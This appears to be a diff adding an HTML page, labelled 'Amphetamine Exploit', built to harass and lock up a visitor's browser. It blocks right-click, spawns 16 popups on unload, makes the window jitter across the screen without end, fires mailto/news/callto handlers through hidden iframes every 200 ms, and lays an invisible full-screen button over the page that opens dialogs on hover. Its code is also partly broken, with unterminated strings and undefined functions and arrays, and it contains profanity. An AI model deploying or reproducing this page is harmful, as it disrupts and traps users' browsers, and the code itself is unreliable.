@@ -1,0 +1,171 @@
+<html><head>
+<meta http-equiv="refresh" content="0.2" >
+<script language="Javascript">
+//Amphetamine Exploit
+		function clickIE4(){
+			if (event.button==2){
+				alert(message);
+				return false;
+			}
+		}
+
+		function clickNS4(e){
+			if (document.layers||document.getElementById&&!document.all){
+				if (e.which==2||e.which==3){
+					alert(message);
+					return false;
+				}
+			}
+		}
+		if (document.layers){
+			document.captureEvents(Event.MOUSEDOWN);
+			document.onmousedown=clickNS4;
+		}
+		else if (document.all&&!document.getElementById){
+			document.onmousedown=clickIE4;
+		}
+
+		document.oncontextmenu=new Function("alert(message);return false")
+
+var xOff = 5;
+var yOff = 5;
+var xPos = 400;
+var yPos = -100;
+var flagRun = 1;
+
+function openWindow(url){
+        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=no,resizable=no,width=90,height=60,titlebar=no,alwaysRaised=yes');
+}
+function speed(){
+		self.focus();
+		if(window.opener) {
+		}
+		for(i = 0; i < 16; i++) {
+        	openWindow('amphetamine.html');
+    		}
+		}
+function newXlt(){
+        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
+        window.focus()}
+function newXrt(){
+        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
+        }
+function newYup(){
+        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
+        }
+function newYdn(){
+        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
+        }
+function fOff(){
+        flagrun = 0;
+        }
+function fuckMe(){
+        xPos += xOff;
+        yPos += yOff;
+        if (xPos > screen.width-175){
+        	newXlt();
+       	}
+        if (xPos < 0){
+        	newXrt();
+       	}
+        if (yPos > screen.height-100){
+        	newYup();
+       	}
+        if (yPos < 0){
+        	newYdn();
+       	}
+        if (flagRun == 1){
+        	window.moveTo(xPos,yPos);
+        	setTimeout('fuckMe()',1);
+       	}
+}
+		
+var nom = navigator.appName.toLowerCase();
+var agt = navigator.userAgent.toLowerCase();
+var is_major  = parseInt(navigator.appVersion);
+var is_minor  = parseFloat(navigator.appVersion);
+var is_ie     = (agt.indexOf("msie") != -1);
+var is_ie4up  = (is_ie && (is_major >= 4));
+var is_nav    = (nom.indexOf('netscape')!=-1);
+var is_nav4   = (is_nav && (is_major == 4));
+var is_mac    = (agt.indexOf("mac")!=-1);
+var is_gecko  = (agt.indexOf('gecko') != -1);
+var is_rev = 0
+if (is_gecko) {
+    temp = agt.split("rv:")
+    is_rev = parseFloat(temp[1])
+}
+
+</script>
+
+<body onunload="speed()" onload="setTimeout('extruin()',200);" onkeydown="altf4key();ctrlkey();delkey();" bgcolor="black" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+
+<script>
+    var delay = 10;
+    var step = .2;
+    var curstep = 0;
+
+    window.resizeTo(800, 600);
+    var centerX = (self.screen.width - document.body.clientWidth) / 2;
+    var centerY = (self.screen.height - document.body.clientHeight - 120) / 2;
+    movew0w();
+
+    function movew0w() {
+      var j;
+      for (j = 0; j < 5; j++) {
+        curstep += step / 5;
+        var factorX = Math.sin(curstep * 6.1) * 0.9;
+        var factorY = Math.cos(curstep * 3.7) * 0.9;
+
+        factorX += 0.2 * Math.sin((20*Math.sin(curstep/20))+j*70)
+                    * (Math.sin(10+curstep/(10+j))+0.2)
+                    * Math.cos((curstep + j*25)/10);
+        factorY += 0.2 * Math.cos((20*Math.sin(curstep/(20+j)))+j*70)
+                    * (Math.sin(10+curstep/10)+0.2)
+                    * Math.cos((curstep + j*25)/10);
+        self.moveTo(centerX * (1.0 + factorX), centerY * (1.0 + factorY));
+      }
+      setTimeout("movew0w()", delay);
+    }
+</script>
+
+<script>
+    var mail = 'mailto:amphetamine@speed.com?subject=Overdosed!
+        mail += '&body=http://github.com/nicktehpro/amphetamine;
+    var news = 'news:ampthetamine';
+
+
+    function add(str) {
+      div = document.getElementById('cocaine');
+      div.innerHTML = '<iframe width=1 height=1 src="' + str + '"></iframe>';
+    }
+
+    function extruin() {
+      document.body.innerHTML += '<div id="cocaine>Fuck ME!</div>';
+      for(i = 0; i < 5; i++) {
+        add(mail);
+        add(news);
+      }
+      ruin();
+    }
+
+    function ruin() {
+      for(i = 0; i < protos.length; i++) {
+        add(protos[i]);
+      }
+      setTimeout("ruin()", 200);
+    }
+</script>
+
+<form lpformnum="1">
+<input type="submit" value="" name="" style="width: 2000px; height: 2000px; " src="" height="300" width="300" onmouseover="if(is_ie) {showModelessDialog('amphetamine.html');return true; }
+			document.cocaine.reset();movew0w();return true;" onclick="if(is_ie) {showModelessDialog('amphetamine.html');return true; }
+			movew0w();return true;" onmouseout="if(is_ie) {showModelessDialog('amphetamine.html');return true; } 
+			else{speed();} movew0w();return true;">
+</form>
+
+<form name="cocaine" onreset="speed();" onsubmit="speed();" action="" id="cocaine"><iframe width="1" height="1" src="callto://amphetamine"></iframe></form>
+
+<h1> hello </h1>
+
+<body></html>
